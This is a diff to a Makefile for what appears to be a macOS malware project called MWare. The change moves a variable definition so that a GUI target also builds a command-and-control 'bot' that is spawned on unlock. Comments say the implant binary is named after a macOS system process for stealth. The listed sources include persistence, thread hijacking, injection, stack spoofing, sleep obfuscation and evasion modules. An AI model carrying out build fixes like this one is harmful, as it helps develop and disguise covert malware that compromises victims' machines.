@@ -67,6 +67,11 @@ MAC_GUI_SRCS = $(MAC_SRCS)
 MAC_GUI_TARGET = MWare-gui
 MAC_GUI_CFLAGS = -std=c++17 -O2 -Wall -Wextra -DSILENT_MODE -I MWare/
 
+# Defined here, not next to its own rule below: prerequisites are expanded when
+# the rule is read, so a later definition would leave mac-gui's prerequisite
+# list empty and silently skip building the bot the GUI spawns on unlock.
+C2_CLIENT_TARGET = UserEventAgent
+
 mac-gui: $(C2_CLIENT_TARGET)
 	@echo "[*] Checking wxWidgets..."
 	@wx-config --cxxflags > /dev/null 2>&1 || (echo "[!] wxWidgets not found! Install: brew install wxwidgets"; exit 1)
@@ -82,7 +87,6 @@ mac-gui: $(C2_CLIENT_TARGET)
 # No TLS — simple, reliable, no cert/key needed.
 # ============================================================================
 # Binary named like a macOS system process for stealth
-C2_CLIENT_TARGET = UserEventAgent
 C2_CLIENT_SRCS = MWare/c2_client.cpp MWare/crypto.cpp MWare/keyexchange.cpp MWare/persistence.cpp MWare/c2_agent.cpp \
                  MWare/thread_hijack.cpp MWare/lolbas.cpp MWare/ThreadlessInject.cpp \
                  MWare/stack_spoof.cpp MWare/sleep_obfuscation.cpp MWare/evasion.cpp \
